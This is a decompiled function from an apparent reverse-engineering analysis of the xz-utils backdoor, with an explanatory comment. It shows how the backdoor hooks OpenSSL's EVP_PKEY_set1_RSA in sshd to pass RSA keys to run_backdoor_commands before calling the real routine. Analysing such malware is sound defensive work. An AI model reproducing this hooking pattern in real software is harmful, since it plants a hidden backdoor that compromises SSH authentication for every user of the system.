// /home/kali/xzre-ghidra/xzregh/10A2D0_hook_EVP_PKEY_set1_RSA.c
// Function: hook_EVP_PKEY_set1_RSA @ 0x10A2D0
// Calling convention: unknown
// Prototype: undefined hook_EVP_PKEY_set1_RSA(void)


/*
 * AutoDoc: Observes when sshd wraps an RSA key in an EVP_PKEY, hands the key to `run_backdoor_commands`, and then falls through to the true OpenSSL routine. It guarantees the backdoor sees host keys even if the decrypt hook never fires.
 */
#include "xzre_types.h"


undefined8 hook_EVP_PKEY_set1_RSA(undefined8 param_1,long param_2)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined8 uVar1;
  undefined1 local_1c [4];
  
  if (((global_ctx != 0) && (*(long *)(global_ctx + 8) != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(code **)(*(long *)(global_ctx + 8) + 8),
     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (param_2 != 0) {
      run_backdoor_commands(param_2,global_ctx,local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a323. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2);
    return uVar1;
  }
  return 0;
}

